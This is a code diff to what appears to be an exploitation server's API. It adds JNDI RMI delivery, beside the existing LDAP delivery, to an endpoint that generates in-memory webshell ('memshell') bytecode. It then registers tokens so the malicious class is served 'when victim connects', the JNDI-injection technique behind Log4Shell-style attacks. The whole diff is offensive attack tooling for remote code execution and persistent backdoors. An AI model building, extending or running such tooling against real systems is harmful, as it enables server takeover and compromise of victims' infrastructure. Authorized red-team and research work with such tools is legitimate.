@@ -13,7 +13,7 @@ from ..config import get_settings
 from ..db import get_session
 from ..models import OobToken, Project, User
 from ..payloads.catalog import CATALOG_BY_ID
-from ..payloads.jndi_builder import jndi_ldap_url
+from ..payloads.jndi_builder import jndi_ldap_url, jndi_rmi_url
 from ..schemas import MemshellRequest, MemshellResponse, PayloadResponse
 
 log = logging.getLogger(__name__)
@@ -79,12 +79,6 @@ async def generate_memshell(
     token = body.token or params.get("token") or ""
     deliver_via = body.deliver
 
-    if deliver_via == "jndi_rmi":
-        raise HTTPException(
-            status.HTTP_501_NOT_IMPLEMENTED,
-            "JNDI RMI delivery is not implemented; use jndi_ldap instead.",
-        )
-
     # Ask sidecar for bytecode
     try:
         async with httpx.AsyncClient(timeout=s.sidecar_timeout) as cli:
@@ -117,6 +111,12 @@ async def generate_memshell(
         url = jndi_ldap_url(token, s, class_name)
         delivery_payload = PayloadResponse(type="jndi_ldap", content_type="text/plain", value=url)
         # Update token intent so LDAP server serves the class when victim connects
+        if bytecode_b64:
+            await _update_token_intent(session, token, "jndi", class_name, bytecode_b64)
+
+    elif deliver_via == "jndi_rmi" and token:
+        url = jndi_rmi_url(token, s, class_name)
+        delivery_payload = PayloadResponse(type="jndi_rmi", content_type="text/plain", value=url)
         if bytecode_b64:
             await _update_token_intent(session, token, "jndi", class_name, bytecode_b64)
 
